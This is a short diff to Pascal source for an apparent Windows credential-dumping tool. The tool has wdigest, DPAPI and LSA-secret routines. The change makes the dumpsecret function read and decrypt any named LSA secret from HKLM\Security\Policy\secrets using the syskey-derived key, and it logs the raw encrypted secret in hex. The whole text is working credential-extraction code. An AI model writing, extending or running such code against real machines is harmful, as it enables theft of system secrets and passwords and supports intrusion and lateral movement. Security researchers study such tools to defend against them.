@@ -16,7 +16,7 @@ function wdigest(pid:dword):boolean;
 function dpapi(pid:dword):boolean;
 
 function lsasecret(key:string;var output:tbytes):boolean;
-function dumpsecret(const syskey:tbyte16;var output:tbytes):boolean;
+//function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes):boolean;
 
 var
   deskey,aeskey,iv:tbytes;
@@ -197,23 +197,21 @@ type
 
 
 
-function dumpsecret(const syskey:tbyte16;var output:tbytes):boolean;
+function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes):boolean;
 var
-  ret:long;
-  topkey:thandle;
-  cbdata,lptype:dword;
+  ret:boolean;
+  cbdata:dword;
   data,clearsecret,secret,system_key,key:tbytes; //array[0..1023] of byte;
 begin
   result:=false;
   log('**** dumpsecret ****');
   //we should check PolRevision first to decide nt5 vs nt6
   //but also PolEKList" vs "PolSecretEncryptionKey
-  if MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\PolEKList'),pchar(''),data) then
+  ret:=MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\PolEKList'),pchar(''),data);
+  if ret then
   begin
     log('MyRegQueryValue OK',0);
-  //if 1=1 then
-  //   begin
-     cbdata:=length(data);
+    cbdata:=length(data);
      log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
      log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
      //lets decode this encrypted secret stored in the registry
@@ -245,7 +243,7 @@ begin
     //if we got a system key, lets decrypt a secret stored in the registry
     if length(system_key)>0 then
       begin
-      if MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\secrets\DPAPI_SYSTEM\CurrVal'),pchar(''),data) then
+      if MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\secrets\'+regkey+'\CurrVal'),pchar(''),data) then
         begin
         log('MyRegQueryValue OK',0);
          cbdata:=length(data);
